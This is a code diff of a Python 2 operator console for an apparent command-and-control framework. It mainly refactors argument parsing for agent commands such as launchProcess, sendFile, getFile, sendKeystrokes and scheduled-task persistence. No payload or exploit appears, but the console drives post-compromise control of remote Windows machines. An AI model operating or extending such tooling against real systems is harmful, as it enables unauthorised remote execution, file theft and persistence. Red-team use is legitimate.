@@ -345,8 +345,12 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Missing arguments. Command format: launchProcess <executable name or path> [arguments]")
 			return
 		
-		arguments = args.split(' ',1)
-		
+		try:
+			arguments = helpers.retrieveArgs(args,2)
+		except ValueError as e:
+			print helpers.color("[!] Wrong arguments format: {}".format(e))
+			return
+	
 		# Path normalization for Windows
 		exePath = arguments[0].replace("/","\\")
 		parameters = arguments[1] if len(arguments) > 1 else " "
@@ -368,6 +372,7 @@ class AgentMenu(cmd.Cmd):
 			
 		# Retrieve arguments		
 		arguments = args.split(' ',1)
+
 		moduleName = arguments[0]
 		moduleArgs = arguments[1] if len(arguments) > 1 else " "
 		
@@ -423,7 +428,12 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Missing arguments. Command format: polling <period> [deviation]")
 			return
 		
-		arguments = args.split()
+		try:
+			arguments = helpers.retrieveArgs(args,2)
+		except ValueError as e:
+			print helpers.color("[!] Wrong arguments format: {}".format(e))
+			return
+
 		try:
 			period = int(arguments[0])
 			deviation = int(arguments[1]) if len(arguments) > 1 else 50
@@ -435,7 +445,7 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Period cannot be a negative number")
 			return
 		if deviation not in range(10,51):
-			print helpers.color("[!] Deviation can only be between 1 and 50%")
+			print helpers.color("[!] Deviation can only be between 10 and 50%")
 			return
 			
 		self.agentHandler.taskAgentWithNewPolling(period, deviation)
@@ -453,7 +463,12 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Missing arguments. Command format: sendFile <local file> [destination path]")
 			return
 		
-		arguments = args.split()
+		try:
+			arguments = helpers.retrieveArgs(args,2)
+		except ValueError as e:
+			print helpers.color("[!] Wrong arguments format: {}".format(e))
+			return
+	
 		localFile = arguments[0]
 		
 		# Path normalization for Windows
@@ -470,7 +485,14 @@ class AgentMenu(cmd.Cmd):
 		
 	#------------------------------------------------------------------------------------
 	def complete_sendFile(self, text, line, startidx, endidx):
-		return [f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)]
+		result = []
+		for f in os.listdir('.'):
+			if os.path.isfile(f) and f.startswith(text):
+				if f.count(' ') > 0:
+					result.append('"' + f + '"')
+				else:
+					result.append(f)
+		return result
 
 	#------------------------------------------------------------------------------------
 	def do_getFile(self, args):
@@ -485,8 +507,14 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Missing arguments. Command format: getFile <agent local file>")
 			return
 		
+		try:
+			arguments = helpers.retrieveArgs(args,1)
+		except ValueError as e:
+			print helpers.color("[!] Wrong arguments format: {}".format(e))
+			return
+
 		# Path normalization for Windows
-		filePath = args.split()[0].replace("/","\\")
+		filePath = arguments[0].replace("/","\\")
 		
 		self.agentHandler.taskAgentWithGetFile(filePath)
 
@@ -561,7 +589,11 @@ class AgentMenu(cmd.Cmd):
 			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
 			return
 		
-		arguments = args.split()
+		try:
+			arguments = helpers.retrieveArgs(args,2)
+		except ValueError as e:
+			print helpers.color("[!] Wrong arguments format: {}".format(e))
+			return
 
 		if len(arguments) < 2:
 			print helpers.color("[!] Missing arguments. Command format: sendKeystrokes <process_name> <keys>")
@@ -586,26 +618,15 @@ class AgentMenu(cmd.Cmd):
 
 	#------------------------------------------------------------------------------------
 	def do_persist(self, args):
-		"""persist <stageName>\nEnable agent persistency of a specified stage by the means of a scheduled task"""
+		"""persist\nEnable agent persistency by the means of a scheduled task"""
 
 		if not self.statusHandler.agentCanBeTasked(self.agentHandler.agentID):
 			print helpers.color("[!] Agent can't be tasked, either because it's DEAD or already tasked with something")
 			return
 
-		# Checking args
-		if not args:
-			print helpers.color("[!] Missing arguments. Command format: persist <stageName>")
-			return
-
-		stageName = args.split()[0]
-
-		if not self.statusHandler.isValidStage(stageName):
-			print helpers.color("[!] Invalid stage: wrong name or no shared URL found")
-			return
-
 		confirmation = raw_input(helpers.color("[!] Set agent persistency? Are you sure? (y/N) "))
 		if confirmation.lower() == 'y':
-			self.agentHandler.taskAgentWithPersist(stageName)
+			self.agentHandler.taskAgentWithPersist()
 
 	#------------------------------------------------------------------------------------
 	def complete_persist(self, text, line, startidx, endidx):
